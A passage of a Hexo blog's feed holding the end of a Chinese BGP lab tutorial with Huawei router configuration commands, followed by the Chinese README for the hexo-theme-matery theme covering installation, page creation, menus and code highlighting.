class="line-numbers-rows"><span></span><span></span></span></code></pre><p>指定发送BGP报文的源接口，并可指定发起连接时使用的源地址<br>指定建立EBGP连接允许的最大跳数。缺省情况下，EBGP连接允许的最大跳数为1，即只能在物理直连链路上建立EBGP连接</p><h4 id="基本BGP配置实验："><a href="#基本BGP配置实验：" class="headerlink" title="基本BGP配置实验："></a>基本BGP配置实验：</h4><img src="https://shierjinghuang.github.io/2023/03/31/外部网关路由协议 BGP/基本BGP实验拓扑.png" alt="基本BGP实验拓扑" style="zoom: 67%;" /><h5 id="配置接口：如上图所示配置接口地址和环回地址"><a href="#配置接口：如上图所示配置接口地址和环回地址" class="headerlink" title="配置接口：如上图所示配置接口地址和环回地址"></a>配置接口：如上图所示配置接口地址和环回地址</h5><h5 id="R1与R2之间的两条链路分别配置物理接口的peer（EBGP）："><a href="#R1与R2之间的两条链路分别配置物理接口的peer（EBGP）：" class="headerlink" title="R1与R2之间的两条链路分别配置物理接口的peer（EBGP）："></a>R1与R2之间的两条链路分别配置物理接口的peer（EBGP）：</h5><p><strong>R1:</strong></p><pre class="line-numbers language-none"><code class="language-none">bgp 100peer 12.12.12.2 as-number 200 peer 21.21.21.2 as-number 200network 1.1.1.0 24<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><strong>R2:</strong></p><pre class="line-numbers language-none"><code class="language-none">bgp 200peer 12.12.12.1 as-number 100 peer 21.21.21.1 as-number 100<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h5 id="R2和R3之间建立回环peer（IBGP）："><a href="#R2和R3之间建立回环peer（IBGP）：" class="headerlink" title="R2和R3之间建立回环peer（IBGP）："></a>R2和R3之间建立回环peer（IBGP）：</h5><p>1 . R2和R3上建立32位回环口，启动OSPF，公告网络及回环地址，但不能公告与AS100和AS300直连的网络，目的保障IP通信；</p><p><strong>R2：</strong></p><pre class="line-numbers language-none"><code class="language-none">ospf 1 area 0.0.0.0 network 2.2.2.0 0.0.0.255 network 23.23.23.0 0.0.0.255<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><strong>R3：</strong></p><pre class="line-numbers language-none"><code class="language-none">ospf 1 area 0.0.0.0 network 3.3.3.0 0.0.0.255 network 23.23.23.0 0.0.0.255<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>2 . 保障R2与R3上回环口可ping通（打通IP网络）;</p><p><strong>R2:</strong></p><pre class="line-numbers language-none"><code class="language-none">bgp 200peer 3.3.3.3 as-number 200 peer 3.3.3.3 connect-interface LoopBack 0peer 3.3.3.3 next-hop-local<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><strong>R3:</strong></p><pre class="line-numbers language-none"><code class="language-none">bgp 200peer 2.2.2.2 as-number 200 peer 2.2.2.2 connect-interface LoopBack 0peer 2.2.2.2 next-hop-local<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h5 id="配置R3、R4的EBGP："><a href="#配置R3、R4的EBGP：" class="headerlink" title="配置R3、R4的EBGP："></a>配置R3、R4的EBGP：</h5><p>1 . R4建立回环口，表示业务网络，</p> <pre class="line-numbers language-none"><code class="language-none">Interface loopback 0Ip add 4.4.4.4 24&#x2F;&#x2F;并在BGP300中公告；bgp 300network 4.4.4.0 24<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>2 . 采用回环口的形式建立EBGP的peer</p><p><strong>R4：</strong></p><pre class="line-numbers language-none"><code class="language-none">bgp 300peer 3.3.3.3 as-number 200 peer 3.3.3.3 ebgp-max-hop 7 &#x2F;&#x2F;解决EBGP的AS之间交换路由TTL&#x3D;1的问题；peer 3.3.3.3 connect-interface LoopBack 0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>本实验，EBGP采用回环建立Peer。但一般情况下，EBGP邻居采用物理接口地址建立Peer。</p><p>   系统视图设置静态路由：</p><pre class="line-numbers language-none"><code class="language-none">ip route-static 3.3.3.3 255.255.255.255 34.34.34.3<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>//注意3.3.3.3为R3的回环口地址，掩码采用32位，目的是解决由EBGP300到200的路由公告中，若静态和BGP同时存在，BGP只选择静态路由，因静态优先级60，而BGP为255.使用32位掩码使得BGP的路由和静态路由成为两条不同路由同时存在。此时在R3或者R4上使用disp ip routing查看，其中关于4.4.4.0网络的IP路由表没有BGP的只有静态的</p><p>3 . 配置R3的回环EBGP</p><p><strong>R3：</strong></p><pre class="line-numbers language-none"><code class="language-none">peer 4.4.4.4 as-number 300 peer 4.4.4.4 ebgp-max-hop 7 peer 4.4.4.4 connect-interface LoopBack 0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>系统视图：</p><pre class="line-numbers language-none"><code class="language-none">ip route-static 4.4.4.4 255.255.255.255 34.34.34.4<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>此时分别在AS100和AS300中查看路由表。Disp bgp routing-table</p><p>在R1进行 <font color="red">ping –a 1.1.1.1 4.4.4.4</font> 操作，如果能够ping通则说明实验实现成功</p>]]></content>
    
    
      
      
    <summary type="html">&lt;center&gt;&lt;h1&gt;外部网关路由协议 BGP&lt;/h1&gt;&lt;/center&gt;
[TOC]

&lt;h2 id=&quot;BGP概述&quot;&gt;&lt;a href=&quot;#BGP概述&quot; class=&quot;headerlink&quot; title=&quot;BGP概述&quot;&gt;&lt;/a&gt;BGP概述&lt;/h2&gt;&lt;p&gt;OSPF、IS-IS等I</summary>
      
    
    
    
    <category term="HCIP" scheme="https://shierjinghuang.github.io/categories/HCIP/"/>
    
    
    <category term="HCIP" scheme="https://shierjinghuang.github.io/tags/HCIP/"/>
    
    <category term="BGP" scheme="https://shierjinghuang.github.io/tags/BGP/"/>
    
  </entry>
  
  <entry>
    <title>hexo-theme-matery</title>
    <link href="https://shierjinghuang.github.io/2023/03/30/README_CN/"/>
    <id>https://shierjinghuang.github.io/2023/03/30/README_CN/</id>
    <published>2023-03-29T23:58:35.000Z</published>
    <updated>2023-03-30T00:52:52.289Z</updated>
    
    <content type="html"><![CDATA[<h1><center>hexo-theme-matery</center></h1><p><a href="http://hits.dwyl.io/blinkfox/hexo-theme-matery"><img src="http://hits.dwyl.io/blinkfox/hexo-theme-matery.svg" alt="HitCount"></a> <a href="https://gitter.im/hexo-theme-matery/Lobby?utm_source=badge"><img src="https://img.shields.io/gitter/room/blinkfox/hexo-theme-matery.svg" alt="Gitter"></a> <a href="https://github.com/blinkfox/hexo-theme-matery/issues"><img src="https://img.shields.io/github/issues/blinkfox/hexo-theme-matery.svg" alt="GitHub issues"></a> <a href="https://github.com/blinkfox/hexo-theme-matery/blob/master/LICENSE"><img src="https://img.shields.io/github/license/blinkfox/hexo-theme-matery.svg" alt="GitHub license"></a> <a href="https://codeload.github.com/blinkfox/hexo-theme-matery/zip/master"><img src="https://img.shields.io/badge/downloads-master-green.svg" alt="Download"></a> <a href="http://hexo.io/"><img src="https://img.shields.io/badge/hexo-%3E%3D%205.0.0-blue.svg" alt="Hexo Version"></a> <a href="https://github.com/blinkfox/hexo-theme-matery/network"><img src="https://img.shields.io/github/forks/blinkfox/hexo-theme-matery.svg" alt="GitHub forks"></a> <a href="https://github.com/blinkfox/hexo-theme-matery/stargazers"><img src="https://img.shields.io/github/stars/blinkfox/hexo-theme-matery.svg" alt="GitHub stars"></a></p><p><a href="README.md">🇺🇸English Document</a> | <a href="http://blinkfox.com/">国内访问示例 (http://blinkfox.com)</a> | <a href="https://blinkfox.github.io/">Github 部署演示示例 (https://blinkfox.github.io)</a> </p><p>QQ 交流群1（已满）: <a href="https://jq.qq.com/?_wv=1027&k=5zMDYHT"><code>926552981</code></a> | QQ 交流群2（已满）: <a href="https://jq.qq.com/?_wv=1027&k=53q2Ayp"><code>971887688</code></a> | QQ 交流群3（推荐）: <a href="https://qm.qq.com/cgi-bin/qm/qr?k=fC1-kU-_aTn4q-JQq4GsYKr4WcKdgfGa&jump_from=webapi"><code>670694035</code></a></p><blockquote><p>这是一个采用 <code>Material Design</code> 和响应式设计的 Hexo 博客主题。</p></blockquote><h2 id="特性"><a href="#特性" class="headerlink" title="特性"></a>特性</h2><ul><li>简单漂亮，文章内容美观易读</li><li><a href="https://material.io/">Material Design</a> 设计</li><li>响应式设计，博客在桌面端、平板、手机等设备上均能很好的展现</li><li>首页轮播文章及每天动态切换 <code>Banner</code> 图片</li><li>瀑布流式的博客文章列表（文章无特色图片时会有 <code>24</code> 张漂亮的图片代替）</li><li>时间轴式的归档页</li><li><strong>词云</strong>的标签页和<strong>雷达图</strong>的分类页</li><li>丰富的关于我页面（包括关于我、文章统计图、我的项目、我的技能、相册等）</li><li>可自定义的数据的友情链接页面</li><li>支持文章置顶和文章打赏</li><li>支持 <code>MathJax</code></li><li><code>TOC</code> 目录</li><li>可设置复制文章内容时追加版权信息</li><li>可设置阅读文章时做密码验证</li><li><a href="https://gitalk.github.io/">Gitalk</a>、<a href="https://imsun.github.io/gitment/">Gitment</a>、<a href="https://valine.js.org/">Valine</a> 和 <a href="https://disqus.com/">Disqus</a> 评论模块（推荐使用 <code>Gitalk</code>）</li><li>集成了<a href="http://busuanzi.ibruce.info/">不蒜子统计</a>、谷歌分析（<code>Google Analytics</code>）和文章字数统计等功能</li><li>支持在首页的音乐播放和视频播放功能</li><li>支持<code>emoji</code>表情，用<code>markdown emoji</code>语法书写直接生成对应的能<strong>跳跃</strong>的表情。</li><li>支持 <a href="http://www.daovoice.io/">DaoVoice</a>、<a href="https://www.tidio.com/">Tidio</a> 在线聊天功能。</li></ul><h2 id="贡献者"><a href="#贡献者" class="headerlink" title="贡献者"></a>贡献者</h2><p>感谢下面列出的贡献者，没有他们，hexo-theme-matery 不会这么完美。</p><ul><li><a href="https://github.com/HarborZeng">@HarborZeng</a></li><li><a href="https://github.com/shw2018">@shw2018</a></li><li><a href="https://github.com/L1cardo">@L1cardo</a></li><li><a href="https://github.com/Five-great">@Five-great</a></li></ul><h2 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h2><p>本主题<strong>推荐你使用 Hexo 5.0.0 及以上的版本</strong>。如果，你已经有一个自己的 <a href="https://hexo.io/zh-cn/">Hexo</a> 博客了，建议你将 Hexo 升级到最新稳定的版本。</p><p>点击 <a href="https://codeload.github.com/blinkfox/hexo-theme-matery/zip/master">这里</a> 下载 <code>master</code> 分支的最新稳定版的代码，解压缩后，将 <code>hexo-theme-matery</code> 的文件夹复制到你 Hexo 的 <code>themes</code> 文件夹中即可。</p><p>当然你也可以在你的 <code>themes</code> 文件夹下使用 <code>git clone</code> 命令来下载:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> clone https://github.com/blinkfox/hexo-theme-matery.git<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><h3 id="切换主题"><a href="#切换主题" class="headerlink" title="切换主题"></a>切换主题</h3><p>修改 Hexo 根目录下的 <code>_config.yml</code> 的  <code>theme</code> 的值：<code>theme: hexo-theme-matery</code></p><h4 id="config-yml-文件的其它修改建议"><a href="#config-yml-文件的其它修改建议" class="headerlink" title="_config.yml 文件的其它修改建议:"></a><code>_config.yml</code> 文件的其它修改建议:</h4><ul><li>请修改 <code>_config.yml</code> 的 <code>url</code> 的值为你的网站主 <code>URL</code>（如：<code>http://xxx.github.io</code>）。</li><li>建议修改两个 <code>per_page</code> 的分页条数值为 <code>6</code> 的倍数，如：<code>12</code>、<code>18</code> 等，这样文章列表在各个屏幕下都能较好的显示。</li><li>如果你是中文用户，则建议修改 <code>language</code> 的值为 <code>zh-CN</code>。</li></ul><h3 id="新建分类-categories-页"><a href="#新建分类-categories-页" class="headerlink" title="新建分类 categories 页"></a>新建分类 categories 页</h3><p><code>categories</code> 页是用来展示所有分类的页面，如果在你的博客 <code>source</code> 目录下还没有 <code>categories/index.md</code> 文件，那么你就需要新建一个，命令如下：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hexo new page <span class="token string">"categories"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>编辑你刚刚新建的页面文件 <code>/source/categories/index.md</code>，至少需要以下内容：</p><pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml"><span class="token punctuation">---</span><span class="token key atrule">title</span><span class="token punctuation">:</span> categories<span class="token key atrule">date</span><span class="token punctuation">:</span> <span class="token datetime number">2018-09-30 17:25:30</span><span class="token key atrule">type</span><span class="token punctuation">:</span> <span class="token string">"categories"</span><span class="token key atrule">layout</span><span class="token punctuation">:</span> <span class="token string">"categories"</span><span class="token punctuation">---</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="新建标签-tags-页"><a href="#新建标签-tags-页" class="headerlink" title="新建标签 tags 页"></a>新建标签 tags 页</h3><p><code>tags</code> 页是用来展示所有标签的页面，如果在你的博客 <code>source</code> 目录下还没有 <code>tags/index.md</code> 文件，那么你就需要新建一个，命令如下：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hexo new page <span class="token string">"tags"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>编辑你刚刚新建的页面文件 <code>/source/tags/index.md</code>，至少需要以下内容：</p><pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml"><span class="token punctuation">---</span><span class="token key atrule">title</span><span class="token punctuation">:</span> tags<span class="token key atrule">date</span><span class="token punctuation">:</span> <span class="token datetime number">2018-09-30 18:23:38</span><span class="token key atrule">type</span><span class="token punctuation">:</span> <span class="token string">"tags"</span><span class="token key atrule">layout</span><span class="token punctuation">:</span> <span class="token string">"tags"</span><span class="token punctuation">---</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="新建关于我-about-页"><a href="#新建关于我-about-页" class="headerlink" title="新建关于我 about 页"></a>新建关于我 about 页</h3><p><code>about</code> 页是用来展示<strong>关于我和我的博客</strong>信息的页面，如果在你的博客 <code>source</code> 目录下还没有 <code>about/index.md</code> 文件，那么你就需要新建一个，命令如下：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hexo new page <span class="token string">"about"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>编辑你刚刚新建的页面文件 <code>/source/about/index.md</code>，至少需要以下内容：</p><pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml"><span class="token punctuation">---</span><span class="token key atrule">title</span><span class="token punctuation">:</span> about<span class="token key atrule">date</span><span class="token punctuation">:</span> <span class="token datetime number">2018-09-30 17:25:30</span><span class="token key atrule">type</span><span class="token punctuation">:</span> <span class="token string">"about"</span><span class="token key atrule">layout</span><span class="token punctuation">:</span> <span class="token string">"about"</span><span class="token punctuation">---</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="新建留言板-contact-页（可选的）"><a href="#新建留言板-contact-页（可选的）" class="headerlink" title="新建留言板 contact 页（可选的）"></a>新建留言板 contact 页（可选的）</h3><p><code>contact</code> 页是用来展示<strong>留言板</strong>信息的页面，如果在你的博客 <code>source</code> 目录下还没有 <code>contact/index.md</code> 文件，那么你就需要新建一个，命令如下：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hexo new page <span class="token string">"contact"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>编辑你刚刚新建的页面文件 <code>/source/contact/index.md</code>，至少需要以下内容：</p><pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml"><span class="token punctuation">---</span><span class="token key atrule">title</span><span class="token punctuation">:</span> contact<span class="token key atrule">date</span><span class="token punctuation">:</span> <span class="token datetime number">2018-09-30 17:25:30</span><span class="token key atrule">type</span><span class="token punctuation">:</span> <span class="token string">"contact"</span><span class="token key atrule">layout</span><span class="token punctuation">:</span> <span class="token string">"contact"</span><span class="token punctuation">---</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p><strong>注</strong>：本留言板功能依赖于第三方评论系统，请<strong>激活</strong>你的评论系统才有效果。并且在主题的 <code>_config.yml</code> 文件中，第 <code>19</code> 至 <code>21</code> 行的“<strong>菜单</strong>”配置，取消关于留言板的注释即可。</p></blockquote><h3 id="新建友情链接-friends-页（可选的）"><a href="#新建友情链接-friends-页（可选的）" class="headerlink" title="新建友情链接 friends 页（可选的）"></a>新建友情链接 friends 页（可选的）</h3><p><code>friends</code> 页是用来展示<strong>友情链接</strong>信息的页面，如果在你的博客 <code>source</code> 目录下还没有 <code>friends/index.md</code> 文件，那么你就需要新建一个，命令如下：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hexo new page <span class="token string">"friends"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>编辑你刚刚新建的页面文件 <code>/source/friends/index.md</code>，至少需要以下内容：</p><pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml"><span class="token punctuation">---</span><span class="token key atrule">title</span><span class="token punctuation">:</span> friends<span class="token key atrule">date</span><span class="token punctuation">:</span> <span class="token datetime number">2018-12-12 21:25:30</span><span class="token key atrule">type</span><span class="token punctuation">:</span> <span class="token string">"friends"</span><span class="token key atrule">layout</span><span class="token punctuation">:</span> <span class="token string">"friends"</span><span class="token punctuation">---</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>同时，在你的博客 <code>source</code> 目录下新建 <code>_data</code> 目录，在 <code>_data</code> 目录中新建 <code>friends.json</code> 文件，文件内容如下所示：</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">[</span><span class="token punctuation">&#123;</span>    <span class="token property">"avatar"</span><span class="token operator">:</span> <span class="token string">"http://image.luokangyuan.com/1_qq_27922023.jpg"</span><span class="token punctuation">,</span>    <span class="token property">"name"</span><span class="token operator">:</span> <span class="token string">"码酱"</span><span class="token punctuation">,</span>    <span class="token property">"introduction"</span><span class="token operator">:</span> <span class="token string">"我不是大佬，只是在追寻大佬的脚步"</span><span class="token punctuation">,</span>    <span class="token property">"url"</span><span class="token operator">:</span> <span class="token string">"http://luokangyuan.com/"</span><span class="token punctuation">,</span>    <span class="token property">"title"</span><span class="token operator">:</span> <span class="token string">"前去学习"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>    <span class="token property">"avatar"</span><span class="token operator">:</span> <span class="token string">"http://image.luokangyuan.com/4027734.jpeg"</span><span class="token punctuation">,</span>    <span class="token property">"name"</span><span class="token operator">:</span> <span class="token string">"闪烁之狐"</span><span class="token punctuation">,</span>    <span class="token property">"introduction"</span><span class="token operator">:</span> <span class="token string">"编程界大佬，技术牛，人还特别好，不懂的都可以请教大佬"</span><span class="token punctuation">,</span>    <span class="token property">"url"</span><span class="token operator">:</span> <span class="token string">"https://blinkfox.github.io/"</span><span class="token punctuation">,</span>    <span class="token property">"title"</span><span class="token operator">:</span> <span class="token string">"前去学习"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>    <span class="token property">"avatar"</span><span class="token operator">:</span> <span class="token string">"http://image.luokangyuan.com/avatar.jpg"</span><span class="token punctuation">,</span>    <span class="token property">"name"</span><span class="token operator">:</span> <span class="token string">"ja_rome"</span><span class="token punctuation">,</span>    <span class="token property">"introduction"</span><span class="token operator">:</span> <span class="token string">"平凡的脚步也可以走出伟大的行程"</span><span class="token punctuation">,</span>    <span class="token property">"url"</span><span class="token operator">:</span> <span class="token string">"https://me.csdn.net/jlh912008548"</span><span class="token punctuation">,</span>    <span class="token property">"title"</span><span class="token operator">:</span> <span class="token string">"前去学习"</span><span class="token punctuation">&#125;</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="新建-404-页"><a href="#新建-404-页" class="headerlink" title="新建 404 页"></a>新建 404 页</h3><p>如果在你的博客 <code>source</code> 目录下还没有 <code>404.md</code> 文件，那么你就需要新建一个</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hexo new page <span class="token number">404</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>编辑你刚刚新建的页面文件 <code>/source/404/index.md</code>，至少需要以下内容：</p><pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml"><span class="token punctuation">---</span><span class="token key atrule">title</span><span class="token punctuation">:</span> <span class="token number">404</span><span class="token key atrule">date</span><span class="token punctuation">:</span> <span class="token datetime number">2018-09-30 17:25:30</span><span class="token key atrule">type</span><span class="token punctuation">:</span> <span class="token string">"404"</span><span class="token key atrule">layout</span><span class="token punctuation">:</span> <span class="token string">"404"</span><span class="token key atrule">description</span><span class="token punctuation">:</span> <span class="token string">"Oops～，我崩溃了！找不到你想要的页面 :("</span><span class="token punctuation">---</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="菜单导航配置"><a href="#菜单导航配置" class="headerlink" title="菜单导航配置"></a>菜单导航配置</h3><h4 id="配置基本菜单导航的名称、路径url和图标icon"><a href="#配置基本菜单导航的名称、路径url和图标icon" class="headerlink" title="配置基本菜单导航的名称、路径url和图标icon."></a>配置基本菜单导航的名称、路径url和图标icon.</h4><p>1.菜单导航名称可以是中文也可以是英文(如：<code>Index</code>或<code>主页</code>)<br>2.图标icon 可以在<a href="https://fontawesome.com/icons">Font Awesome</a> 中查找   </p><pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml"><span class="token key atrule">menu</span><span class="token punctuation">:</span>  <span class="token key atrule">Index</span><span class="token punctuation">:</span>    <span class="token key atrule">url</span><span class="token punctuation">:</span> /    <span class="token key atrule">icon</span><span class="token punctuation">:</span> fas fa<span class="token punctuation">-</span>home  <span class="token key atrule">Tags</span><span class="token punctuation">:</span>    <span class="token key atrule">url</span><span class="token punctuation">:</span> /tags    <span class="token key atrule">icon</span><span class="token punctuation">:</span> fas fa<span class="token punctuation">-</span>tags  <span class="token key atrule">Categories</span><span class="token punctuation">:</span>    <span class="token key atrule">url</span><span class="token punctuation">:</span> /categories    <span class="token key atrule">icon</span><span class="token punctuation">:</span> fas fa<span class="token punctuation">-</span>bookmark  <span class="token key atrule">Archives</span><span class="token punctuation">:</span>    <span class="token key atrule">url</span><span class="token punctuation">:</span> /archives    <span class="token key atrule">icon</span><span class="token punctuation">:</span> fas fa<span class="token punctuation">-</span>archive  <span class="token key atrule">About</span><span class="token punctuation">:</span>    <span class="token key atrule">url</span><span class="token punctuation">:</span> /about    <span class="token key atrule">icon</span><span class="token punctuation">:</span> fas fa<span class="token punctuation">-</span>user<span class="token punctuation">-</span>circle  <span class="token key atrule">Friends</span><span class="token punctuation">:</span>    <span class="token key atrule">url</span><span class="token punctuation">:</span> /friends    <span class="token key atrule">icon</span><span class="token punctuation">:</span> fas fa<span class="token punctuation">-</span>address<span class="token punctuation">-</span>book<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="二级菜单配置方法"><a href="#二级菜单配置方法" class="headerlink" title="二级菜单配置方法"></a>二级菜单配置方法</h4><p>如果你需要二级菜单则可以在原基本菜单导航的基础上如下操作</p><ol><li>在需要添加二级菜单的一级菜单下添加<code>children</code>关键字(如:<code>About</code>菜单下添加<code>children</code>)     </li><li>在<code>children</code>下创建二级菜单的 名称name,路径url和图标icon.      </li><li>注意每个二级菜单模块前要加 <code>-</code>.     </li><li>注意缩进格式  </li></ol><pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml"><span class="token key atrule">menu</span><span class="token punctuation">:</span>  <span class="token key atrule">Index</span><span class="token punctuation">:</span>    <span class="token key atrule">url</span><span class="token punctuation">:</span> /    <span class="token key atrule">icon</span><span class="token punctuation">:</span> fas fa<span class="token punctuation">-</span>home  <span class="token key atrule">Tags</span><span class="token punctuation">:</span>    <span class="token key atrule">url</span><span class="token punctuation">:</span> /tags    <span class="token key atrule">icon</span><span class="token punctuation">:</span> fas fa<span class="token punctuation">-</span>tags  <span class="token key atrule">Categories</span><span class="token punctuation">:</span>    <span class="token key atrule">url</span><span class="token punctuation">:</span> /categories    <span class="token key atrule">icon</span><span class="token punctuation">:</span> fas fa<span class="token punctuation">-</span>bookmark  <span class="token key atrule">Archives</span><span class="token punctuation">:</span>    <span class="token key atrule">url</span><span class="token punctuation">:</span> /archives    <span class="token key atrule">icon</span><span class="token punctuation">:</span> fas fa<span class="token punctuation">-</span>archive  <span class="token key atrule">About</span><span class="token punctuation">:</span>    <span class="token key atrule">url</span><span class="token punctuation">:</span> /about    <span class="token key atrule">icon</span><span class="token punctuation">:</span> fas fa<span class="token punctuation">-</span>user<span class="token punctuation">-</span>circle<span class="token punctuation">-</span>o  <span class="token key atrule">Friends</span><span class="token punctuation">:</span>    <span class="token key atrule">url</span><span class="token punctuation">:</span> /friends    <span class="token key atrule">icon</span><span class="token punctuation">:</span> fas fa<span class="token punctuation">-</span>address<span class="token punctuation">-</span>book  <span class="token key atrule">Medias</span><span class="token punctuation">:</span>    <span class="token key atrule">icon</span><span class="token punctuation">:</span> fas fa<span class="token punctuation">-</span>list    <span class="token key atrule">children</span><span class="token punctuation">:</span>      <span class="token punctuation">-</span> <span class="token key atrule">name</span><span class="token punctuation">:</span> Music        <span class="token key atrule">url</span><span class="token punctuation">:</span> /music        <span class="token key atrule">icon</span><span class="token punctuation">:</span> fas fa<span class="token punctuation">-</span>music      <span class="token punctuation">-</span> <span class="token key atrule">name</span><span class="token punctuation">:</span> Movies        <span class="token key atrule">url</span><span class="token punctuation">:</span> /movies        <span class="token key atrule">icon</span><span class="token punctuation">:</span> fas fa<span class="token punctuation">-</span>film      <span class="token punctuation">-</span> <span class="token key atrule">name</span><span class="token punctuation">:</span> Books        <span class="token key atrule">url</span><span class="token punctuation">:</span> /books        <span class="token key atrule">icon</span><span class="token punctuation">:</span> fas fa<span class="token punctuation">-</span>book      <span class="token punctuation">-</span> <span class="token key atrule">name</span><span class="token punctuation">:</span> Galleries        <span class="token key atrule">url</span><span class="token punctuation">:</span> /galleries        <span class="token key atrule">icon</span><span class="token punctuation">:</span> fas fa<span class="token punctuation">-</span>image<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="代码高亮"><a href="#代码高亮" class="headerlink" title="代码高亮"></a>代码高亮</h3><p>从 Hexo5.0 版本开始自带了 <code>prismjs</code> 代码语法高亮的支持，本主题对此进行了改造支持。</p><p>如果你的博客中曾经安装过 <code>hexo-prism-plugin</code> 的插件，那么你须要执行 <code>npm uninstall hexo-prism-plugin</code> 来卸载掉它，否则生成的代码中会有 <code>&amp;#123;</code> 和 <code>&amp;#125;</code> 的转义字符。</p><p>然后，修改 Hexo 根目录下 <code>_config.yml</code> 文件中 <code>highlight.enable</code> 的值为 <code>false</code>，并将 <code>prismjs.enable</code> 的值设置为 <code>true</code>，主要配置如下：</p><pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml"><span class="token key atrule">highlight</span><span class="token punctuation">:</span>  <span class="token key atrule">enable</span><span class="token punctuation">:</span> <span class="token boolean important">false</span>  <span class="token key atrule">line_number</span><span class="token punctuation">:</span> <span class="token boolean important">true</span>  <span class="token key atrule">auto_detect</span><span class="token punctuation">:</span> <span class="token boolean important">false</span>  <span class="token key atrule">tab_replace</span><span class="token punctuation">:</span> <span class="token string">''</span>  <span class="token key atrule">wrap</span><span class="token punctuation">:</span> <span class="token boolean important">true</span>  <span class="token key atrule">hljs</span><span class="token punctuation">:</span> <span class="token boolean important">false</span><span class="token key atrule">prismjs</span><span class="token punctuation">:</span>  <span class="token key atrule">enable</span><span class="token punctuation">:</span> <span class="token boolean important">true</span>  <span class="token key atrule">preprocess</span><span class="token punctuation">:</span> <span class="token boolean important">true</span>  <span class="token key atrule">line_number</span><span class="token punctuation">:</span> <span class="token boolean important">true</span>  <span class="token key atrule">tab_replace</span><span class="token punctuation">:</span> <span class="token string">''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>主题中默认的 <code>prismjs</code> 主题是 <code>Tomorrow Night</code>，如果你想定制自己的主题，可以前往 <a href="https://prismjs.com/download.html">prismjs 下载页面</a> 定制下载自己喜欢的主题 <code>css</code> 文件，然后将此 css 主题文件取名为 <code>prism.css</code>，替换掉 <code>hexo-theme-matery</code> 主题文件夹中的 <code>source/libs/prism/prism.css</code> 文件即可。</p><h3 id="搜索"><a href="#搜索" class="headerlink" title="搜索"></a>搜索</h3><p>本主题中还使用到了 <a href="https://github.com/wzpan/hexo-generator-search">hexo-generator-search</a> 的 Hexo 插件来做内容搜索，安装命令如下：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">npm</span> <span class="token 